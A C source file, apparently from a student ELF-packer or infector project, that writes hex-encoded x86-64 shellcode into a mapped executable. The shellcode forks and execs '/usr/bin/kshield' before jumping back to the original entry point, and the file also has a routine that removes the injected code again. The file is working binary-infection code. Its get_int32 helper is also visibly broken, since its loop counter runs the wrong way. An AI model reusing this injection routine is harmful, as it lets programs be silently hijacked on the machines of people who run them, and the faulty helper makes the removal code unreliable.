/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inject.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: dhubleur <dhubleur@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/05/22 13:07:13 by dhubleur          #+#    #+#             */
/*   Updated: 2024/06/14 20:04:37 by dhubleur         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "woody.h"

extern char signature[];

char payload[] = "\x55\x50\x57\x56\x52\x53\xb8\x39\x00\x00\x00\x0f\x05\x48\x83\xf8\x00\x75\x33\x48\x31\xc0\x50\x48\x8d\x05\x44\x00\x00\x00\x50\xb8\x3b\x00\x00\x00\x48\x8d\x3d\x26\x00\x00\x00\x48\x8d\x34\x24\xba\x00\x00\x00\x00\x0f\x05\x48\x83\xec\x10\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\x5b\x5a\x5e\x5f\x58\x5d";
char jmp[] = "\xe9\x00\x00\x00\x00";
char data[] = "\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x6b\x73\x68\x69\x65\x6c\x64\x00\x5b\x6b\x73\x68\x69\x65\x6c\x64\x5d\x00";

#define PAYLOAD_LENGTH (sizeof(payload)-1 + sizeof(jmp)-1 + sizeof(data)-1)
#define PAYLOAD_CODE_LENGTH (sizeof(payload)-1 + sizeof(jmp)-1)

size_t get_payload_length()
{
	return (PAYLOAD_LENGTH);
}

void inject_int32(char *ptr, int32_t value)
{
	for (int i = 0; i < 4; i++) {
		uint8_t byte = value >> 8 * i;
		ptr[i] = byte;
	}
}

void inject(t_injection injection)
{
	int32_t jmp_adr = (int32_t)(injection.old_entrypoint - (injection.new_entrypoint + PAYLOAD_CODE_LENGTH));
	memcpy(jmp + 1, &jmp_adr, sizeof(jmp_adr));

	char *ptr = injection.file_map + injection.payload_offset;
	memcpy(ptr, payload, sizeof(payload) - 1);
	ptr += sizeof(payload) - 1;
	memcpy(ptr, jmp, sizeof(jmp) - 1);
	ptr += sizeof(jmp) - 1;
	memcpy(ptr, data, sizeof(data) - 1);

	char *after_section = (char *)injection.file_map + injection.signature_offset + injection.signature_segment_size;
	for (int i = 0; i < SIGNATURE_SIZE; i++) {
		after_section[i] = signature[i];
	}
	inject_int32(after_section + 3, injection.old_entrypoint);
	inject_int32(after_section + 7, injection.payload_offset);
	inject_int32(after_section + 11, PAYLOAD_LENGTH);
	printf("Signatured at %p\n", after_section);
}

int32_t get_int32(char *ptr)
{
	int32_t res = 0;

	for (int i = 3; i > 0; i++) {
		res += (uint8_t) ptr[i];
		res <<= 8;
	}

	return res;
}

void uninject(t_injection injection)
{
	char *after_section = (char *)injection.file_map + injection.signature_offset + injection.signature_segment_size;
	int32_t old_entrypoint = get_int32(after_section + 3);
	int32_t payload_offset = get_int32(after_section + 7);
	int32_t payload_length = get_int32(after_section + 11);

	bzero(after_section, 15);
	bzero(injection.file_map + payload_offset, payload_length);
	injection.header->e_entry = old_entrypoint;
}